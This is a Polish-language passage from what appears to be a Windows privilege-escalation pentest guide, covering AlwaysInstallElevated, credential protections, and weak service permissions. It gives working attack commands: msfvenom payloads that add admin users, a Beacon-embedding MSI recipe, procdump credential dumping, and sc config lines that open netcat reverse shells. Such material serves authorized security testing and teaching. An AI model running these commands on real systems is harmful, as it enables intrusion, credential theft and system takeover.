Znajdź **exploit w** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Więcej informacji o przebiegu ataku znajdziesz pod adresem [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Jeśli** te 2 rejestry są **włączone** (wartość to **0x1**), użytkownicy o dowolnym poziomie uprawnień mogą **instalować** (wykonywać) pliki `*.msi` jako NT AUTHORITY\\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Jeśli masz sesję meterpreter, możesz zautomatyzować tę technikę za pomocą modułu **`exploit/windows/local/always_install_elevated`**

### PowerUP

Użyj polecenia `Write-UserAddMSI` z power-up, aby utworzyć w bieżącym katalogu plik binarny MSI systemu Windows służący do eskalacji uprawnień. Ten skrypt zapisuje wstępnie skompilowany instalator MSI, który wyświetla monit o dodanie użytkownika/grupy (wymaga więc dostępu do GIU):

```
Write-UserAddMSI
```

Po prostu uruchom utworzony plik binarny, aby eskalować uprawnienia.

### MSI Wrapper

Przeczytaj ten samouczek, aby dowiedzieć się, jak utworzyć MSI wrapper za pomocą tych narzędzi. Pamiętaj, że możesz opakować plik „**.bat**”, jeśli chcesz tylko **wykonywać** **command lines**.

{{#ref}}
msi-wrapper.md
{{#endref}}

### Tworzenie MSI za pomocą WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Tworzenie MSI za pomocą Visual Studio

- Wygeneruj za pomocą Cobalt Strike lub Metasploit nowy payload TCP dla Windows EXE w `C:\privesc\beacon.exe`
- Otwórz **Visual Studio**, wybierz **Create a new project** i wpisz „installer” w polu wyszukiwania. Wybierz projekt **Setup Wizard** i kliknij **Next**.
- Nadaj projektowi nazwę, na przykład **AlwaysPrivesc**, użyj `C:\privesc` jako lokalizacji, zaznacz **place solution and project in the same directory** i kliknij **Create**.
- Klikaj **Next**, aż dojdziesz do kroku 3 z 4 (wybór plików do dołączenia). Kliknij **Add** i wybierz właśnie wygenerowany payload Beacon. Następnie kliknij **Finish**.
- Zaznacz projekt **AlwaysPrivesc** w **Solution Explorer**, a następnie w **Properties** zmień **TargetPlatform** z **x86** na **x64**.
  - Możesz zmienić także inne właściwości, takie jak **Author** i **Manufacturer**, dzięki czemu zainstalowana aplikacja może wyglądać bardziej wiarygodnie.
- Kliknij projekt prawym przyciskiem myszy i wybierz **View > Custom Actions**.
- Kliknij prawym przyciskiem myszy **Install** i wybierz **Add Custom Action**.
- Kliknij dwukrotnie **Application Folder**, wybierz plik **beacon.exe** i kliknij **OK**. Dzięki temu payload Beacon zostanie uruchomiony od razu po uruchomieniu instalatora.
- W sekcji **Custom Action Properties** zmień **Run64Bit** na **True**.
- Na koniec **zbuduj projekt**.
  - Jeśli pojawi się ostrzeżenie `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, upewnij się, że platforma jest ustawiona na x64.

### Instalacja MSI

Aby uruchomić **instalację** złośliwego pliku `.msi` w tle:

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Aby wykorzystać tę podatność, możesz użyć: _exploit/windows/local/always_install_elevated_

## Antywirus i detektory

### Ustawienia audytu

Te ustawienia określają, co jest **rejestrowane**, więc zwróć na nie uwagę

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Warto wiedzieć, dokąd wysyłane są logi Windows Event Forwarding.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** służy do **zarządzania hasłami lokalnego Administratora**, zapewniając, że każde hasło jest **unikalne, losowe i regularnie aktualizowane** na komputerach dołączonych do domeny. Hasła te są bezpiecznie przechowywane w Active Directory i mogą uzyskać do nich dostęp wyłącznie użytkownicy z odpowiednimi uprawnieniami przyznanymi za pośrednictwem ACL, którzy są upoważnieni do wyświetlania haseł lokalnego administratora.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Jeśli jest aktywny, **hasła w postaci zwykłego tekstu są przechowywane w LSASS** (Local Security Authority Subsystem Service).\
[**Więcej informacji o WDigest na tej stronie**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

Począwszy od **Windows 8.1**, firma Microsoft wprowadziła rozszerzoną ochronę Local Security Authority (LSA), aby **blokować** próby **odczytu jej pamięci** lub wstrzykiwania kodu przez niezaufane procesy, dodatkowo zabezpieczając system.\
[**Więcej informacji o LSA Protection tutaj**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** został wprowadzony w **Windows 10**. Jego celem jest ochrona danych uwierzytelniających przechowywanych na urządzeniu przed zagrożeniami, takimi jak ataki pass-the-hash. [**Więcej informacji o Credential Guard znajdziesz tutaj.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Poświadczenia buforowane

**Poświadczenia domenowe** są uwierzytelniane przez **Local Security Authority** (LSA) i wykorzystywane przez składniki systemu operacyjnego. Po uwierzytelnieniu danych logowania użytkownika przez zarejestrowany pakiet zabezpieczeń zwykle ustanawiane są poświadczenia domenowe tego użytkownika.\
[**Więcej informacji o poświadczeniach buforowanych**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Użytkownicy i grupy

### Enumerowanie użytkowników i grup

Sprawdź, czy którakolwiek z grup, do których należysz, ma interesujące uprawnienia.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Uprzywilejowane grupy

Jeśli **należysz do uprzywilejowanej grupy, możesz mieć możliwość eskalacji uprawnień**. Dowiedz się więcej o uprzywilejowanych grupach i o tym, jak je wykorzystać do eskalacji uprawnień:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Manipulowanie tokenami

**Dowiedz się więcej** o tym, czym jest **token**, na tej stronie: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Na kolejnej stronie dowiesz się, jakie **interesujące tokeny** można znaleźć i jak je wykorzystać:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Zalogowani użytkownicy / sesje

```bash
qwinsta
klist sessions
```

### Katalogi domowe

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Polityka haseł

```bash
net accounts
```

### Uzyskaj zawartość schowka

```bash
powershell -command "Get-Clipboard"
```

## Uruchomione procesy

### Uprawnienia do plików i folderów

Przede wszystkim, podczas wyświetlania listy procesów **sprawdź, czy w wierszu poleceń procesu nie ma haseł**.\
Sprawdź, czy możesz **nadpisać jakiś uruchomiony plik binarny** albo czy masz uprawnienia do zapisu w folderze z plikami binarnymi, aby wykorzystać potencjalne ataki [**DLL Hijacking attacks**](dll-hijacking/index.html):

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Zawsze sprawdzaj, czy nie działają [**debuggery electron/cef/chromium** — można je wykorzystać do eskalacji uprawnień](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

Debugger może nasłuchiwać tylko przez krótki czas, więc jego brak w pojedynczym pasywnym zrzucie portów nie dowodzi, że nigdy nie był dostępny. Powiąż każdy zaobserwowany port nasłuchujący z jego PID-em, właścicielem procesu oraz możliwością uzyskania do niego dostępu przez użytkownika o niższych uprawnieniach; sama nazwa aplikacji ani flaga debugowania nie dowodzą możliwości wykonania kodu między użytkownikami. Podczas rutynowej enumeracji ogranicz się do metod pasywnych i nie wysyłaj poleceń do debuggera.

**Sprawdzanie uprawnień do plików binarnych procesów**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Sprawdzanie uprawnień do folderów z plikami binarnymi procesów (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Katalogi dynamic preprocessor Snort

Snort 2 może ładować biblioteki współdzielone z katalogu `dynamicpreprocessor directory` zadeklarowanego w konfiguracji wybranej za pomocą `snort.exe -c <config>`. W przypadku zaplanowanego zadania lub usługi, która uruchamia Snort na innym koncie, sprawdź dokładnie tę konfigurację oraz ACL zadeklarowanego katalogu modułów. Jeśli Twój token pozwala tworzyć tam pliki, ścieżka ta może być warta sprawdzenia pod kątem code execution przy następnym ładowaniu modułów przez to zadanie lub usługę. Zweryfikuj efektywne uprawnienia konta uruchamiającego, aktywną konfigurację, zgodność modułów oraz wszelkie ograniczenia odmowy dostępu lub udziału; sama możliwość zapisu do katalogu nie potwierdza eskalacji. [Dokumentacja dynamic preprocessor Snort](https://www.snort.org/documents/dpx-readme) opisuje ładowanie modułów w czasie działania.

### Uprzywilejowana usługa sieciowa z zapisywalnym katalogiem dokumentów

W instalacji Apache w systemie Windows porównaj ścieżkę pliku wykonywalnego usługi i konto, na którym jest uruchamiana, z wartością `DocumentRoot` w aktywnym pliku `httpd.conf`. W typowej konfiguracji XAMPP sprawdź `C:\xampp\apache\conf\httpd.conf` oraz ACL skonfigurowanego katalogu dokumentów, często `C:\xampp\htdocs`. Jeśli użytkownik o niższych uprawnieniach może tworzyć pliki w tym katalogu, gdy Apache działa jako `LocalSystem`, server-side code execution może przekroczyć granicę uprawnień hosta. Potwierdź, że usługa działa, że udostępniana jest dokładnie ta ścieżka oraz że handler po stronie serwera przetwarza dany typ pliku; sam zapisywalny katalog potwierdza jedynie możliwość tworzenia plików. Sprawdź ACL bez zapisywania pliku testowego:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

W przypadku standardowej instalacji WAMP usługa może wskazywać na wersjonowany plik `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (lub `C:\wamp\...` w układzie 32-bitowym), a konfiguracja może znajdować się obok niego, w `conf\httpd.conf`, z domyślnym katalogiem głównym `C:\wamp64\www` lub `C:\wamp\www`. Sprawdź jednocześnie dokładny obraz usługi, tożsamość konta, na którym działa, efektywną wartość `DocumentRoot` (uwzględniając rozwinięcie `${INSTALL_DIR}` i nadpisania wirtualnych hostów) oraz ACL katalogu głównego. Katalog WAMP z prawami zapisu nie dowodzi, że Apache działa jako `SYSTEM` ani że wykona przesłany plik. [Apache opisuje, jak usługa Windows wybiera konfigurację](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Zapisywalny katalog główny IIS i tożsamość puli aplikacji w sieci

W przypadku IIS powiąż zapisywalny katalog fizyczny z **aktywną witryną/aplikacją** w `applicationHost.config`, a następnie ustal skonfigurowaną pulę i handler po stronie serwera. Kod umieszczony w udostępnianym katalogu działa jako pula tylko wtedy, gdy IIS przetwarza dany typ pliku, a trasa jest osiągalna. Zanim uznasz zapisywalny katalog za możliwość wykonania kodu, sprawdź efektywne uprawnienia bieżącego użytkownika do tworzenia plików, stan witryny, handler oraz nadpisania ustawień dla danej ścieżki.

Dynamiczna kompilacja ASP.NET wymaga sprawdzenia osobnej ścieżki: wygenerowanych plików w katalogu kompilacji aplikacji. Domyślnie jest to katalog `Temporary ASP.NET Files` w odpowiedniej instalacji .NET Framework, ale ustawienie `<compilation tempDirectory>` aplikacji może zmienić jego lokalizację. [Microsoft opisuje lokalizację i podkatalogi poszczególnych aplikacji](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) oraz [zaleca odizolowanie katalogów kompilacji, gdy pule aplikacji sobie nie ufają](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Jeśli token o niższych uprawnieniach może zmieniać wygenerowany kod źródłowy w pamięci podręcznej **konkretnej** aplikacji, ustal, czy aplikacja ponownie go skompiluje, działając z bardziej uprzywilejowaną [tożsamością procesu roboczego](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Sam ACL pliku lub katalogu nie dowodzi możliwości wykonania kodu: skoreluj pamięć podręczną z aktywną aplikacją, efektywnym tokenem i ACL, ustawieniami kompilacji, tożsamością procesu oraz momentem ewentualnej ponownej kompilacji. Ogranicz się do przeglądu metadanych w trybie tylko do odczytu; podczas enumeracji nie wywołuj kompilacji ani nie modyfikuj plików pamięci podręcznej.

Pula IIS skonfigurowana jako `ApplicationPoolIdentity` lub `NetworkService` zwykle uwierzytelnia się w zasobach domenowych jako **konto komputera hosta**, mimo że jej lokalny token może mieć niskie uprawnienia. `LocalSystem` ma już wysokie uprawnienia lokalne i również używa konta komputera w sieci; `LocalService` zazwyczaj używa anonimowych poświadczeń sieciowych. Pula `SpecificUser` używa skonfigurowanego konta. [Microsoft opisuje te typy tożsamości](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) oraz [tożsamość sieciową puli aplikacji](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Pominięte ustawienie tożsamości może dziedziczyć wartości domyślne puli, które różnią się między wersjami IIS, dlatego ustal efektywną konfigurację, zamiast zgadywać na podstawie nazwy puli. Jeśli wykonanie kodu odbywa się w puli używającej w sieci tożsamości konta komputera, oceń uprawnienia katalogowe **tego konkretnego komputera**. [DCSync](../active-directory-methodology/dcsync.md) wymaga uprawnień replikacji w kontekście nazewniczym domeny; sam bilet konta komputera ani rola hosta nie dowodzą ich posiadania. Pasywna enumeracja powinna obejmować przegląd konfiguracji i ACL bez przesyłania pliku, wykonywania uwierzytelniania sieciowego ani żądania biletów.

W przypadku czytelnego handlera ASP.NET, który uruchamia proces pomocniczy, prześledź każdą wartość pochodzącą z żądania przez uwierzytelnianie, odszyfrowywanie, walidację i budowanie polecenia. Handler, który łączy zdekodowany token z `ProcessStartInfo("cmd", "/c ...")`, może pozwolić metaznakom powłoki na zmianę polecenia; [Microsoft opisuje znaki specjalne `cmd`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Ustal, czy niezaufany użytkownik może faktycznie wpłynąć na zdekodowaną wartość i dotrzeć do handlera, a następnie określ efektywną tożsamość puli aplikacji lub podszytej tożsamości oraz tożsamość procesu potomnego. Czytelna linia kodu źródłowego, nasłuchujący localhost ani słabość formatu tokenu nie dowodzą same w sobie możliwości wykonania uprzywilejowanego polecenia. Podczas pasywnej enumeracji przeglądaj kod źródłowy i konfigurację puli bez wysyłania sfałszowanych żądań ani uruchamiania procesu pomocniczego.

W przypadku usługi PHP w systemie Windows ścieżka kontrolowana przez żądanie, przekazana do [`include` lub `require`](https://www.php.net/manual/en/function.include.php), może spowodować wykonanie pliku PHP zapisywalnego przez użytkownika o niższych uprawnieniach, z tożsamością procesu roboczego. Potwierdź, że żądanie może dotrzeć do tej instrukcji, rozwiązana ścieżka wskazuje plik, który użytkownik o niższych uprawnieniach może modyfikować, a proces roboczy odczytać, obowiązujące ograniczenia ścieżek PHP pozwalają na dołączenie pliku, a proces roboczy rzeczywiście działa z wyższymi uprawnieniami. Nasłuchujący loopback ani sam zapisywalny plik nie potwierdzają tego łańcucha; podczas pasywnej enumeracji sprawdź kod źródłowy, tożsamość usługi i ACL plików bez wywoływania endpointu.

### Pozyskiwanie haseł z pamięci

Za pomocą **procdump** z pakietu sysinternals możesz utworzyć zrzut pamięci działającego procesu. Usługi takie jak FTP przechowują **poświadczenia w pamięci w postaci jawnego tekstu**; spróbuj zrzucić pamięć i odczytać poświadczenia.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Niezabezpieczone aplikacje GUI

**Aplikacje działające jako SYSTEM mogą umożliwiać użytkownikowi uruchomienie CMD lub przeglądanie katalogów.**

Przykład: „Pomoc i obsługa techniczna systemu Windows” (Windows + F1), wyszukaj „wiersz polecenia”, kliknij „Kliknij, aby otworzyć wiersz polecenia”

### Import plików projektów z podwyższonymi uprawnieniami

Aplikacja, która automatycznie otwiera projekty z katalogu zapisywalnego przez użytkownika o niższych uprawnieniach, przekracza granicę zaufania danych wejściowych w kontekście konta importera. Sprawdź **dokładną ścieżkę z prawem zapisu**, proces lub zadanie, które ją otwiera, jego efektywną tożsamość oraz wersję parsera. [Historyczny problem z otwieraniem/przywracaniem projektów Ghidra](https://github.com/NationalSecurityAgency/ghidra/issues/71) umożliwiał użycie zewnętrznych encji XML w metadanych projektu; encja sieciowa w systemie Windows mogła wywołać uwierzytelnianie z konta importującego, jeśli pozwalały na to [zasady ruchu wychodzącego SMB i NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking). To trop wskazujący na możliwość ujawnienia poświadczeń, a nie na natychmiastowy dostęp administratora: uzyskaną odpowiedź trzeba móc wykorzystać przez odrębną autoryzowaną lub podatną ścieżkę, a bieżące wersje należy oceniać na podstawie faktycznego stanu poprawek. Podczas pasywnego rozpoznania nie otwieraj spreparowanego projektu; sprawdź przepływ importu i ACL-e.

## Usługi

Prawo [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) do obiektu Service Control Manager (SCM) jest odrębne od praw do istniejącej usługi. Pomyślne, tylko do odczytu żądanie dostępu [`OpenSCManager`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) z tym prawem jest tropem do dalszej analizy, a nie dowodem, że nowa usługa może zostać uruchomiona. [`CreateService` zwraca uchwyt](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) z prawami dostępu do usługi określonymi podczas jej tworzenia; późniejsze ponowne otwarcie usługi powoduje osobne sprawdzenie dostępu i może się nie powieść, nawet jeśli można było użyć pierwotnego uchwytu. Osobno zweryfikuj efektywny token lokalny lub zdalny, przyznane prawa uchwytu, konto usługi, zasady uruchamiania i ścieżkę pliku wykonywalnego. Podczas pasywnego rozpoznania nie twórz ani nie uruchamiaj usługi.

W przypadku zdalnej ścieżki instalowania usługi zestaw te prawa SCM z udziałem na celu, do którego **to samo logowanie sieciowe** ma prawo zapisu, bazowymi ACL-ami NTFS oraz lokalną ścieżką pliku wykonywalnego, który konto usługi może uruchomić. Konto niebędące administratorem może przekroczyć tę granicę, jeśli istnieją wyjątkowo szerokie prawa SCM i ścieżka umieszczenia pliku; udział administracyjny nie jest warunkiem koniecznym. Samo prawo zapisu do udziału albo sam trop wskazujący na prawo tworzenia usługi w SCM nie dowodzi, że nowa usługa może zostać uruchomiona z wyższą tożsamością.

Istniejąca usługa może wywoływać pomocniczy plik wykonywalny podczas uruchamiania, zamykania lub innego zdarzenia cyklu życia, nawet jeśli tego pliku nie ma w jej `ImagePath`. Jeśli nazwa pomocnika jest rozwiązywana do katalogu zapisywalnego przez użytkownika o niższych uprawnieniach, a usługa działa z wyższą tożsamością, brakujący plik pomocnika może być kandydatem do zastąpienia — pod pewnymi warunkami. Potwierdź **faktyczny kod usługi lub udokumentowane wywołanie pomocnika**, rozwiązaną ścieżkę pliku wykonywalnego i kolejność przeszukiwania, prawa do tworzenia plików w katalogu, tożsamość usługi oraz dostępny wyzwalacz cyklu życia. Katalog usługi z prawem zapisu lub sam brakujący plik nie dowodzą, że usługa załaduje ten plik; podczas pasywnego przeglądu nie uruchamiaj ani nie zatrzymuj usługi.

W przypadku istniejącej usługi [`SERVICE_START` pozwala przekazać argumenty do `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); jest to odrębne od [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Zanim uznasz prawo uruchamiania za coś więcej niż prawo do sterowania usługą, sprawdź jej kod lub udokumentowany interfejs. Jeśli używa argumentu wskazanego przez wywołującego jako ścieżki logu lub eksportu, zweryfikuj tożsamość usługi, dokładny przepływ argumentu do operacji zapisu, ograniczenia ścieżek oraz uprawnienia do **utworzonego pliku**. Zapis do chronionego katalogu może prowadzić do eskalacji tylko wtedy, gdy istnieje odrębny uprzywilejowany proces lub moduł ładujący, który akceptuje ten plik; sam zapisywalny log lub prawo uruchamiania nie wystarczą. Podczas pasywnej inwentaryzacji nie uruchamiaj usługi ani nie twórz pliku testowego.

W przypadku agenta monitorującego NSClient++ dostępny do odczytu plik `nsclient.ini` jest **tropem do analizy konfiguracji**: może zawierać poświadczenia sieci Web, a `boot.ini` może przekierowywać konfigurację do innej lokalizacji. Sprawdź rzeczywiste konto usługi, nasłuchujący WEB i zasady dostępu oraz to, czy uwierzytelniona rola może zmieniać ustawienia lub skrypty. Uprzywilejowane wykonanie wymaga dodatkowo `CheckExternalScripts` (lub innej włączonej ścieżki wykonania), efektywnego prawa do rejestrowania lub modyfikowania polecenia oraz wyzwalacza uruchamiającego je z tożsamością usługi. Nasłuch ograniczony do loopback nadal może być dostępny dla lokalnego użytkownika, ale sama ścieżka pliku, hasło lub nasłuch nie potwierdzają tych praw. Podczas pasywnego rozpoznania sprawdzaj metadane i uprawnienia bez wyświetlania sekretów ani wywoływania API sieci Web. Zobacz [układ plików NSClient++](https://nsclient.org/docs/concepts/file-layout/), [wskazówki dotyczące zabezpieczeń sieci Web i skryptów](https://nsclient.org/docs/setup/securing/) oraz [konfigurację skryptów zewnętrznych](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

W przypadku usługi, której `ImagePath` to `nssm.exe`, sprawdź faktyczne konto, na którym działa usługa, oraz wartość `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM przechowuje tam aplikację potomną](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), natomiast `AppDirectory` określa skonfigurowany katalog roboczy. Zanim uznasz uprawnienia wrappera za pełny obraz granicy usługi, sprawdź plik wykonywalny aplikacji potomnej i ACL-e jego katalogu nadrzędnego. Lokalny punkt końcowy WCF lub SOAP udostępniany przez tę aplikację potomną to odrębny trop do dalszej analizy: potwierdź, że użytkownik o niższych uprawnieniach może dotrzeć do nasłuchującego punktu końcowego, dokładna operacja przyjmuje jego dane wejściowe, a aplikacja potomna usługi wykonuje niebezpieczną operację z wyższą tożsamością. Konto usługi, adres URL punktu końcowego lub zapisywalna ścieżka same w sobie nie dowodzą możliwości eskalacji; podczas pasywnego rozpoznania nie wywołuj operacji usługi.

W przypadku niestandardowej operacji WCF prześledź przepływ ciągu kontrolowanego przez wywołującego do dowolnego runspace PowerShell. [`Pipeline.Commands.AddScript` dodaje tekst skryptu](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), a [`Pipeline.Invoke` uruchamia pipeline](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). [`netTcpBinding` z poświadczeniami transportowymi Windows](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) uwierzytelnia klienta, ale uprawnienia do wywołania **konkretnej** operacji oraz efektywną tożsamość runspace należy sprawdzić osobno. Ścieżka od danych wejściowych wywołującego o niższych uprawnieniach do `AddScript` działającego z wyższą tożsamością usługi stanowi granicę wykonania kodu; nasłuchujący port, uwierzytelniony klient lub niewykorzystywana metoda w niezwiązanym zestawie nie są dowodem. Podczas rozpoznania statycznie sprawdź wdrożoną usługę, kontrakt, autoryzację i ustawienia impersonacji, nie wywołując punktu końcowego.

Wyzwalacze usług pozwalają systemowi Windows uruchamiać usługę po wystąpieniu określonych warunków (aktywność nazwanego potoku/punktu końcowego RPC, zdarzenia ETW, dostępność adresu IP, podłączenie urządzenia, odświeżenie GPO itp.). Nawet bez prawa SERVICE_START często można uruchomić uprzywilejowane usługi, aktywując ich wyzwalacze. Techniki rozpoznawania i aktywacji opisano tutaj:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Usługa kolektora diagnostycznego Visual Studio

Instalacje Visual Studio z narzędziami C/C++ mogą zawierać `VSStandardCollectorService150` — usługę diagnostyczną skonfigurowaną do działania jako `LocalSystem`. W [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) wykorzystano junction i wyścig z object-manager link, aby przekierować reset DACL usługi. Wykazana eskalacja wymagała również użytecznej ścieżki naprawy MSI dostawcy Visual Studio Setup WMI Provider oraz wskazanego w niej pliku `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. Komponent naprawiono w styczniu 2024 r.

Podczas pasywnej wstępnej analizy sprawdź konto i ścieżkę binarną tej usługi, czy istnieje ścieżka kompilatora Setup WMI oraz stan poprawek zainstalowanego komponentu. Sam wpis usługi, wersja produktu Visual Studio lub plik kompilatora nie dowodzą, że host jest podatny. Do sprawdzenia nie trzeba uruchamiać usługi ani przeprowadzać naprawy.

Pobierz listę usług:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Uprawnienia

Możesz użyć **sc**, aby uzyskać informacje o usłudze.

```bash
sc qc <service_name>
```

Zaleca się użycie pliku binarnego **accesschk** z _Sysinternals_, aby sprawdzić wymagany poziom uprawnień dla każdej usługi.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Zaleca się sprawdzić, czy grupa „Authenticated Users” może modyfikować jakąkolwiek usługę:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Możesz pobrać accesschk.exe dla XP stąd](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Włącz usługę

Jeśli pojawia się ten błąd (na przykład w przypadku SSDPSRV):

_Błąd systemu 1058._\
_Nie można uruchomić usługi, ponieważ jest wyłączona lub nie ma skojarzonych z nią włączonych urządzeń._

Możesz ją włączyć za pomocą

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Weź pod uwagę, że usługa upnphost wymaga do działania usługi SSDPSRV (w przypadku XP SP1)**

**Innym obejściem** tego problemu jest uruchomienie:

```
sc.exe config usosvc start= auto
```

### **Modyfikacja ścieżki do pliku binarnego usługi**

W scenariuszu, w którym grupa „Authenticated users” ma uprawnienie **SERVICE_ALL_ACCESS** do usługi, możliwa jest modyfikacja pliku wykonywalnego usługi. Aby zmodyfikować i wykonać **sc**:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Uruchom ponownie usługę

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Uprawnienia można eskalować za pomocą różnych uprawnień:

- **SERVICE_CHANGE_CONFIG**: Umożliwia ponowną konfigurację pliku binarnego usługi.
- **WRITE_DAC**: Umożliwia zmianę uprawnień, co pozwala na zmianę konfiguracji usługi.
- **WRITE_OWNER**: Umożliwia przejęcie własności i zmianę uprawnień.
- **GENERIC_WRITE**: Zapewnia również możliwość zmiany konfiguracji usługi.
- **GENERIC_ALL**: Również zapewnia możliwość zmiany konfiguracji usługi.

Do wykrywania i wykorzystywania tej podatności można użyć modułu _exploit/windows/local/service_permissions_.

### Słabe uprawnienia do plików binarnych usług

